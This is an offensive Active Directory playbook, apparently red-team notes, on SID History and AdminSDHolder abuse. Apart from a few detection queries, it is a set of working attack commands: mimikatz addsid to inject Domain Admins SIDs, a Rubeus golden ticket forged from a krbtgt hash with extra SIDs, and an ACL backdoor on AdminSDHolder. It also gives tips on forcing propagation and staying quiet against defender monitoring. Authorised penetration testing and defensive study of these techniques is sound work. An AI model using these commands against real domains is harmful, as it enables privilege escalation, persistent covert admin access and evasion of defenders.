# SID History + AdminSDHolder

## SID History — detect
Get-DomainUser -Properties sidhistory | ?{$_.sidhistory}
Get-DomainGroup -Properties sidhistory | ?{$_.sidhistory}
- [ ] Non-empty sidHistory in a single-domain forest = planted persistence or a migration leftover
- [ ] Cross-forest: sidHistory containing the parent domain's privileged SIDs = instant escalation

## SID History — abuse (needs DA or DS-Install-Replica-level access)
mimikatz misc::addsid '<ChildDomain>\<User>' '<ParentDomain>\Domain Admins'
.\Rubeus.exe golden /rc4:<krbtgtHash> /domain:<Domain> /sid:<DomainSID> /sids:<PrivilegedSID> /user:<User> /ptt
- [ ] ExtraSids in a golden ticket = same effect without touching the account: :Pb golden-silver
- [ ] SID filtering (trust quarantine) blocks foreign SIDs on external trusts — check the trust type first

## AdminSDHolder — enumerate
Get-DomainObject -Identity 'CN=AdminSDHolder,CN=System,<DomainDN>' -Properties *
Get-DomainObjectACL -Identity 'CN=AdminSDHolder,CN=System,<DomainDN>' -ResolveGUIDs
- [ ] Every 60 min SDProp stamps this ACL onto all protected accounts (DA, EA, Schema Admins, Operators...)
- [ ] Count=0 acl on protected users but not here = defenders cleaned the wrong place

## AdminSDHolder — backdoor
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DomainDN>' -PrincipalIdentity <MyUser> -Rights All -Verbose
- [ ] Wait ≤ 60 min → GenericAll on every protected account in the domain
- [ ] Trigger now: Invoke-ADSDPropagation (or Set-ADObject trick) on Server 2016+

## If it fails
- [ ] addsid errors = SID filtering or insufficient rights on the account object
- [ ] SDProp reverts my change = defender tooling watches AdminSDHolder — quieter: ACL a single high-value protected user instead: :Pb acl-abuse

## Next
- [ ] Privileged ticket in hand → DCSync: :Pb golden-silver
- [ ] Full ACL methodology for the edges I found: :Pb acl-abuse
